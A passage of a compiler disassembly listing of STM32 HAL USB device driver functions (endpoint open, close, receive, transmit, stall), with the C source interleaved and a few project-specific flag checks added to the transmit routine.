 8001fd4:	681b      	ldr	r3, [r3, #0]
 8001fd6:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8001fda:	b292      	uxth	r2, r2
 8001fdc:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8001fe0:	687b      	ldr	r3, [r7, #4]
 8001fe2:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001fe6:	2b00      	cmp	r3, #0
 8001fe8:	d12b      	bne.n	8002042 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001fea:	687b      	ldr	r3, [r7, #4]
 8001fec:	681b      	ldr	r3, [r3, #0]
 8001fee:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001ff2:	b29a      	uxth	r2, r3
 8001ff4:	687b      	ldr	r3, [r7, #4]
 8001ff6:	681b      	ldr	r3, [r3, #0]
 8001ff8:	f042 0204 	orr.w	r2, r2, #4
 8001ffc:	b292      	uxth	r2, r2
 8001ffe:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8002002:	687b      	ldr	r3, [r7, #4]
 8002004:	681b      	ldr	r3, [r3, #0]
 8002006:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800200a:	b29a      	uxth	r2, r3
 800200c:	687b      	ldr	r3, [r7, #4]
 800200e:	681b      	ldr	r3, [r3, #0]
 8002010:	f042 0208 	orr.w	r2, r2, #8
 8002014:	b292      	uxth	r2, r2
 8002016:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 800201a:	687b      	ldr	r3, [r7, #4]
 800201c:	2201      	movs	r2, #1
 800201e:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 8002022:	687b      	ldr	r3, [r7, #4]
 8002024:	681b      	ldr	r3, [r3, #0]
 8002026:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800202a:	b29b      	uxth	r3, r3
 800202c:	089b      	lsrs	r3, r3, #2
 800202e:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 8002032:	687b      	ldr	r3, [r7, #4]
 8002034:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 8002038:	2101      	movs	r1, #1
 800203a:	6878      	ldr	r0, [r7, #4]
 800203c:	f00a ff58 	bl	800cef0 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 8002040:	e02a      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 8002042:	6878      	ldr	r0, [r7, #4]
 8002044:	f00a fc96 	bl	800c974 <HAL_PCD_SuspendCallback>
    return;
 8002048:	e026      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 800204a:	68fb      	ldr	r3, [r7, #12]
 800204c:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8002050:	2b00      	cmp	r3, #0
 8002052:	d00f      	beq.n	8002074 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8002054:	687b      	ldr	r3, [r7, #4]
 8002056:	681b      	ldr	r3, [r3, #0]
 8002058:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800205c:	b29a      	uxth	r2, r3
 800205e:	687b      	ldr	r3, [r7, #4]
 8002060:	681b      	ldr	r3, [r3, #0]
 8002062:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 8002066:	b292      	uxth	r2, r2
 8002068:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 800206c:	6878      	ldr	r0, [r7, #4]
 800206e:	f00a fc54 	bl	800c91a <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002072:	e011      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8002074:	68fb      	ldr	r3, [r7, #12]
 8002076:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800207a:	2b00      	cmp	r3, #0
 800207c:	d00c      	beq.n	8002098 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 800207e:	687b      	ldr	r3, [r7, #4]
 8002080:	681b      	ldr	r3, [r3, #0]
 8002082:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002086:	b29a      	uxth	r2, r3
 8002088:	687b      	ldr	r3, [r7, #4]
 800208a:	681b      	ldr	r3, [r3, #0]
 800208c:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002090:	b292      	uxth	r2, r2
 8002092:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002096:	bf00      	nop
  }
}
 8002098:	3710      	adds	r7, #16
 800209a:	46bd      	mov	sp, r7
 800209c:	bd80      	pop	{r7, pc}

0800209e <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 800209e:	b580      	push	{r7, lr}
 80020a0:	b082      	sub	sp, #8
 80020a2:	af00      	add	r7, sp, #0
 80020a4:	6078      	str	r0, [r7, #4]
 80020a6:	460b      	mov	r3, r1
 80020a8:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80020aa:	687b      	ldr	r3, [r7, #4]
 80020ac:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80020b0:	2b01      	cmp	r3, #1
 80020b2:	d101      	bne.n	80020b8 <HAL_PCD_SetAddress+0x1a>
 80020b4:	2302      	movs	r3, #2
 80020b6:	e013      	b.n	80020e0 <HAL_PCD_SetAddress+0x42>
 80020b8:	687b      	ldr	r3, [r7, #4]
 80020ba:	2201      	movs	r2, #1
 80020bc:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 80020c0:	687b      	ldr	r3, [r7, #4]
 80020c2:	78fa      	ldrb	r2, [r7, #3]
 80020c4:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 80020c8:	687b      	ldr	r3, [r7, #4]
 80020ca:	681b      	ldr	r3, [r3, #0]
 80020cc:	78fa      	ldrb	r2, [r7, #3]
 80020ce:	4611      	mov	r1, r2
 80020d0:	4618      	mov	r0, r3
 80020d2:	f006 f94a 	bl	800836a <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 80020d6:	687b      	ldr	r3, [r7, #4]
 80020d8:	2200      	movs	r2, #0
 80020da:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80020de:	2300      	movs	r3, #0
}
 80020e0:	4618      	mov	r0, r3
 80020e2:	3708      	adds	r7, #8
 80020e4:	46bd      	mov	sp, r7
 80020e6:	bd80      	pop	{r7, pc}

080020e8 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 80020e8:	b580      	push	{r7, lr}
 80020ea:	b084      	sub	sp, #16
 80020ec:	af00      	add	r7, sp, #0
 80020ee:	6078      	str	r0, [r7, #4]
 80020f0:	4608      	mov	r0, r1
 80020f2:	4611      	mov	r1, r2
 80020f4:	461a      	mov	r2, r3
 80020f6:	4603      	mov	r3, r0
 80020f8:	70fb      	strb	r3, [r7, #3]
 80020fa:	460b      	mov	r3, r1
 80020fc:	803b      	strh	r3, [r7, #0]
 80020fe:	4613      	mov	r3, r2
 8002100:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 8002102:	2300      	movs	r3, #0
 8002104:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002106:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800210a:	2b00      	cmp	r3, #0
 800210c:	da0e      	bge.n	800212c <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800210e:	78fb      	ldrb	r3, [r7, #3]
 8002110:	f003 0307 	and.w	r3, r3, #7
 8002114:	1c5a      	adds	r2, r3, #1
 8002116:	4613      	mov	r3, r2
 8002118:	009b      	lsls	r3, r3, #2
 800211a:	4413      	add	r3, r2
 800211c:	00db      	lsls	r3, r3, #3
 800211e:	687a      	ldr	r2, [r7, #4]
 8002120:	4413      	add	r3, r2
 8002122:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002124:	68fb      	ldr	r3, [r7, #12]
 8002126:	2201      	movs	r2, #1
 8002128:	705a      	strb	r2, [r3, #1]
 800212a:	e00e      	b.n	800214a <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800212c:	78fb      	ldrb	r3, [r7, #3]
 800212e:	f003 0207 	and.w	r2, r3, #7
 8002132:	4613      	mov	r3, r2
 8002134:	009b      	lsls	r3, r3, #2
 8002136:	4413      	add	r3, r2
 8002138:	00db      	lsls	r3, r3, #3
 800213a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800213e:	687a      	ldr	r2, [r7, #4]
 8002140:	4413      	add	r3, r2
 8002142:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002144:	68fb      	ldr	r3, [r7, #12]
 8002146:	2200      	movs	r2, #0
 8002148:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 800214a:	78fb      	ldrb	r3, [r7, #3]
 800214c:	f003 0307 	and.w	r3, r3, #7
 8002150:	b2da      	uxtb	r2, r3
 8002152:	68fb      	ldr	r3, [r7, #12]
 8002154:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 8002156:	883a      	ldrh	r2, [r7, #0]
 8002158:	68fb      	ldr	r3, [r7, #12]
 800215a:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 800215c:	68fb      	ldr	r3, [r7, #12]
 800215e:	78ba      	ldrb	r2, [r7, #2]
 8002160:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 8002162:	78bb      	ldrb	r3, [r7, #2]
 8002164:	2b02      	cmp	r3, #2
 8002166:	d102      	bne.n	800216e <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 8002168:	68fb      	ldr	r3, [r7, #12]
 800216a:	2200      	movs	r2, #0
 800216c:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 800216e:	687b      	ldr	r3, [r7, #4]
 8002170:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002174:	2b01      	cmp	r3, #1
 8002176:	d101      	bne.n	800217c <HAL_PCD_EP_Open+0x94>
 8002178:	2302      	movs	r3, #2
 800217a:	e00e      	b.n	800219a <HAL_PCD_EP_Open+0xb2>
 800217c:	687b      	ldr	r3, [r7, #4]
 800217e:	2201      	movs	r2, #1
 8002180:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 8002184:	687b      	ldr	r3, [r7, #4]
 8002186:	681b      	ldr	r3, [r3, #0]
 8002188:	68f9      	ldr	r1, [r7, #12]
 800218a:	4618      	mov	r0, r3
 800218c:	f003 fe8c 	bl	8005ea8 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002190:	687b      	ldr	r3, [r7, #4]
 8002192:	2200      	movs	r2, #0
 8002194:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002198:	7afb      	ldrb	r3, [r7, #11]
}
 800219a:	4618      	mov	r0, r3
 800219c:	3710      	adds	r7, #16
 800219e:	46bd      	mov	sp, r7
 80021a0:	bd80      	pop	{r7, pc}

080021a2 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80021a2:	b580      	push	{r7, lr}
 80021a4:	b084      	sub	sp, #16
 80021a6:	af00      	add	r7, sp, #0
 80021a8:	6078      	str	r0, [r7, #4]
 80021aa:	460b      	mov	r3, r1
 80021ac:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80021ae:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80021b2:	2b00      	cmp	r3, #0
 80021b4:	da0e      	bge.n	80021d4 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80021b6:	78fb      	ldrb	r3, [r7, #3]
 80021b8:	f003 0307 	and.w	r3, r3, #7
 80021bc:	1c5a      	adds	r2, r3, #1
 80021be:	4613      	mov	r3, r2
 80021c0:	009b      	lsls	r3, r3, #2
 80021c2:	4413      	add	r3, r2
 80021c4:	00db      	lsls	r3, r3, #3
 80021c6:	687a      	ldr	r2, [r7, #4]
 80021c8:	4413      	add	r3, r2
 80021ca:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80021cc:	68fb      	ldr	r3, [r7, #12]
 80021ce:	2201      	movs	r2, #1
 80021d0:	705a      	strb	r2, [r3, #1]
 80021d2:	e00e      	b.n	80021f2 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021d4:	78fb      	ldrb	r3, [r7, #3]
 80021d6:	f003 0207 	and.w	r2, r3, #7
 80021da:	4613      	mov	r3, r2
 80021dc:	009b      	lsls	r3, r3, #2
 80021de:	4413      	add	r3, r2
 80021e0:	00db      	lsls	r3, r3, #3
 80021e2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80021e6:	687a      	ldr	r2, [r7, #4]
 80021e8:	4413      	add	r3, r2
 80021ea:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80021ec:	68fb      	ldr	r3, [r7, #12]
 80021ee:	2200      	movs	r2, #0
 80021f0:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 80021f2:	78fb      	ldrb	r3, [r7, #3]
 80021f4:	f003 0307 	and.w	r3, r3, #7
 80021f8:	b2da      	uxtb	r2, r3
 80021fa:	68fb      	ldr	r3, [r7, #12]
 80021fc:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80021fe:	687b      	ldr	r3, [r7, #4]
 8002200:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002204:	2b01      	cmp	r3, #1
 8002206:	d101      	bne.n	800220c <HAL_PCD_EP_Close+0x6a>
 8002208:	2302      	movs	r3, #2
 800220a:	e00e      	b.n	800222a <HAL_PCD_EP_Close+0x88>
 800220c:	687b      	ldr	r3, [r7, #4]
 800220e:	2201      	movs	r2, #1
 8002210:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002214:	687b      	ldr	r3, [r7, #4]
 8002216:	681b      	ldr	r3, [r3, #0]
 8002218:	68f9      	ldr	r1, [r7, #12]
 800221a:	4618      	mov	r0, r3
 800221c:	f004 fa08 	bl	8006630 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002220:	687b      	ldr	r3, [r7, #4]
 8002222:	2200      	movs	r2, #0
 8002224:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 8002228:	2300      	movs	r3, #0
}
 800222a:	4618      	mov	r0, r3
 800222c:	3710      	adds	r7, #16
 800222e:	46bd      	mov	sp, r7
 8002230:	bd80      	pop	{r7, pc}

08002232 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002232:	b580      	push	{r7, lr}
 8002234:	b086      	sub	sp, #24
 8002236:	af00      	add	r7, sp, #0
 8002238:	60f8      	str	r0, [r7, #12]
 800223a:	607a      	str	r2, [r7, #4]
 800223c:	603b      	str	r3, [r7, #0]
 800223e:	460b      	mov	r3, r1
 8002240:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002242:	7afb      	ldrb	r3, [r7, #11]
 8002244:	f003 0207 	and.w	r2, r3, #7
 8002248:	4613      	mov	r3, r2
 800224a:	009b      	lsls	r3, r3, #2
 800224c:	4413      	add	r3, r2
 800224e:	00db      	lsls	r3, r3, #3
 8002250:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002254:	68fa      	ldr	r2, [r7, #12]
 8002256:	4413      	add	r3, r2
 8002258:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800225a:	697b      	ldr	r3, [r7, #20]
 800225c:	687a      	ldr	r2, [r7, #4]
 800225e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002260:	697b      	ldr	r3, [r7, #20]
 8002262:	683a      	ldr	r2, [r7, #0]
 8002264:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 8002266:	697b      	ldr	r3, [r7, #20]
 8002268:	2200      	movs	r2, #0
 800226a:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 800226c:	697b      	ldr	r3, [r7, #20]
 800226e:	2200      	movs	r2, #0
 8002270:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002272:	7afb      	ldrb	r3, [r7, #11]
 8002274:	f003 0307 	and.w	r3, r3, #7
 8002278:	b2da      	uxtb	r2, r3
 800227a:	697b      	ldr	r3, [r7, #20]
 800227c:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800227e:	68fb      	ldr	r3, [r7, #12]
 8002280:	681b      	ldr	r3, [r3, #0]
 8002282:	6979      	ldr	r1, [r7, #20]
 8002284:	4618      	mov	r0, r3
 8002286:	f004 fbc0 	bl	8006a0a <USB_EPStartXfer>

  return HAL_OK;
 800228a:	2300      	movs	r3, #0
}
 800228c:	4618      	mov	r0, r3
 800228e:	3718      	adds	r7, #24
 8002290:	46bd      	mov	sp, r7
 8002292:	bd80      	pop	{r7, pc}

08002294 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002294:	b480      	push	{r7}
 8002296:	b083      	sub	sp, #12
 8002298:	af00      	add	r7, sp, #0
 800229a:	6078      	str	r0, [r7, #4]
 800229c:	460b      	mov	r3, r1
 800229e:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 80022a0:	78fb      	ldrb	r3, [r7, #3]
 80022a2:	f003 0207 	and.w	r2, r3, #7
 80022a6:	6879      	ldr	r1, [r7, #4]
 80022a8:	4613      	mov	r3, r2
 80022aa:	009b      	lsls	r3, r3, #2
 80022ac:	4413      	add	r3, r2
 80022ae:	00db      	lsls	r3, r3, #3
 80022b0:	440b      	add	r3, r1
 80022b2:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 80022b6:	681b      	ldr	r3, [r3, #0]
}
 80022b8:	4618      	mov	r0, r3
 80022ba:	370c      	adds	r7, #12
 80022bc:	46bd      	mov	sp, r7
 80022be:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022c2:	4770      	bx	lr

080022c4 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80022c4:	b580      	push	{r7, lr}
 80022c6:	b086      	sub	sp, #24
 80022c8:	af00      	add	r7, sp, #0
 80022ca:	60f8      	str	r0, [r7, #12]
 80022cc:	607a      	str	r2, [r7, #4]
 80022ce:	603b      	str	r3, [r7, #0]
 80022d0:	460b      	mov	r3, r1
 80022d2:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80022d4:	7afb      	ldrb	r3, [r7, #11]
 80022d6:	f003 0307 	and.w	r3, r3, #7
 80022da:	1c5a      	adds	r2, r3, #1
 80022dc:	4613      	mov	r3, r2
 80022de:	009b      	lsls	r3, r3, #2
 80022e0:	4413      	add	r3, r2
 80022e2:	00db      	lsls	r3, r3, #3
 80022e4:	68fa      	ldr	r2, [r7, #12]
 80022e6:	4413      	add	r3, r2
 80022e8:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80022ea:	697b      	ldr	r3, [r7, #20]
 80022ec:	687a      	ldr	r2, [r7, #4]
 80022ee:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80022f0:	697b      	ldr	r3, [r7, #20]
 80022f2:	683a      	ldr	r2, [r7, #0]
 80022f4:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 80022f6:	697b      	ldr	r3, [r7, #20]
 80022f8:	2201      	movs	r2, #1
 80022fa:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 80022fe:	697b      	ldr	r3, [r7, #20]
 8002300:	683a      	ldr	r2, [r7, #0]
 8002302:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 8002304:	697b      	ldr	r3, [r7, #20]
 8002306:	2200      	movs	r2, #0
 8002308:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 800230a:	697b      	ldr	r3, [r7, #20]
 800230c:	2201      	movs	r2, #1
 800230e:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002310:	7afb      	ldrb	r3, [r7, #11]
 8002312:	f003 0307 	and.w	r3, r3, #7
 8002316:	b2da      	uxtb	r2, r3
 8002318:	697b      	ldr	r3, [r7, #20]
 800231a:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 800231c:	4b0e      	ldr	r3, [pc, #56]	; (8002358 <HAL_PCD_EP_Transmit+0x94>)
 800231e:	781b      	ldrb	r3, [r3, #0]
 8002320:	f003 0302 	and.w	r3, r3, #2
 8002324:	2b00      	cmp	r3, #0
 8002326:	d102      	bne.n	800232e <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 8002328:	4b0c      	ldr	r3, [pc, #48]	; (800235c <HAL_PCD_EP_Transmit+0x98>)
 800232a:	2201      	movs	r2, #1
 800232c:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800232e:	68fb      	ldr	r3, [r7, #12]
 8002330:	681b      	ldr	r3, [r3, #0]
 8002332:	6979      	ldr	r1, [r7, #20]
 8002334:	4618      	mov	r0, r3
 8002336:	f004 fb68 	bl	8006a0a <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 800233a:	4b07      	ldr	r3, [pc, #28]	; (8002358 <HAL_PCD_EP_Transmit+0x94>)
 800233c:	781b      	ldrb	r3, [r3, #0]
 800233e:	f003 0302 	and.w	r3, r3, #2
 8002342:	2b00      	cmp	r3, #0
 8002344:	d102      	bne.n	800234c <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 8002346:	4b06      	ldr	r3, [pc, #24]	; (8002360 <HAL_PCD_EP_Transmit+0x9c>)
 8002348:	2201      	movs	r2, #1
 800234a:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 800234c:	2300      	movs	r3, #0
}
 800234e:	4618      	mov	r0, r3
 8002350:	3718      	adds	r7, #24
 8002352:	46bd      	mov	sp, r7
 8002354:	bd80      	pop	{r7, pc}
 8002356:	bf00      	nop
 8002358:	2000026c 	.word	0x2000026c
 800235c:	20000270 	.word	0x20000270
 8002360:	2000027c 	.word	0x2000027c

08002364 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002364:	b580      	push	{r7, lr}
 8002366:	b084      	sub	sp, #16
 8002368:	af00      	add	r7, sp, #0
 800236a:	6078      	str	r0, [r7, #4]
 800236c:	460b      	mov	r3, r1
 800236e:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 8002370:	78fb      	ldrb	r3, [r7, #3]
 8002372:	f003 0207 	and.w	r2, r3, #7
 8002376:	687b      	ldr	r3, [r7, #4]
 8002378:	685b      	ldr	r3, [r3, #4]
 800237a:	429a      	cmp	r2, r3
 800237c:	d901      	bls.n	8002382 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 800237e:	2301      	movs	r3, #1
 8002380:	e04c      	b.n	800241c <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002382:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002386:	2b00      	cmp	r3, #0
 8002388:	da0e      	bge.n	80023a8 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800238a:	78fb      	ldrb	r3, [r7, #3]
 800238c:	f003 0307 	and.w	r3, r3, #7
 8002390:	1c5a      	adds	r2, r3, #1
 8002392:	4613      	mov	r3, r2
 8002394:	009b      	lsls	r3, r3, #2
 8002396:	4413      	add	r3, r2
 8002398:	00db      	lsls	r3, r3, #3
 800239a:	687a      	ldr	r2, [r7, #4]
 800239c:	4413      	add	r3, r2
 800239e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023a0:	68fb      	ldr	r3, [r7, #12]
 80023a2:	2201      	movs	r2, #1
 80023a4:	705a      	strb	r2, [r3, #1]
 80023a6:	e00c      	b.n	80023c2 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80023a8:	78fa      	ldrb	r2, [r7, #3]
 80023aa:	4613      	mov	r3, r2
 80023ac:	009b      	lsls	r3, r3, #2
 80023ae:	4413      	add	r3, r2
 80023b0:	00db      	lsls	r3, r3, #3
 80023b2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023b6:	687a      	ldr	r2, [r7, #4]
 80023b8:	4413      	add	r3, r2
 80023ba:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023bc:	68fb      	ldr	r3, [r7, #12]
 80023be:	2200      	movs	r2, #0
 80023c0:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 80023c2:	68fb      	ldr	r3, [r7, #12]
 80023c4:	2201      	movs	r2, #1
 80023c6:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80023c8:	78fb      	ldrb	r3, [r7, #3]
 80023ca:	f003 0307 	and.w	r3, r3, #7
 80023ce:	b2da      	uxtb	r2, r3
 80023d0:	68fb      	ldr	r3, [r7, #12]
 80023d2:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80023d4:	687b      	ldr	r3, [r7, #4]
 80023d6:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023da:	2b01      	cmp	r3, #1
 80023dc:	d101      	bne.n	80023e2 <HAL_PCD_EP_SetStall+0x7e>
 80023de:	2302      	movs	r3, #2
 80023e0:	e01c      	b.n	800241c <HAL_PCD_EP_SetStall+0xb8>
 80023e2:	687b      	ldr	r3, [r7, #4]
 80023e4:	2201      	movs	r2, #1
 80023e6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 80023ea:	687b      	ldr	r3, [r7, #4]
 80023ec:	681b      	ldr	r3, [r3, #0]
 80023ee:	68f9      	ldr	r1, [r7, #12]
 80023f0:	4618      	mov	r0, r3
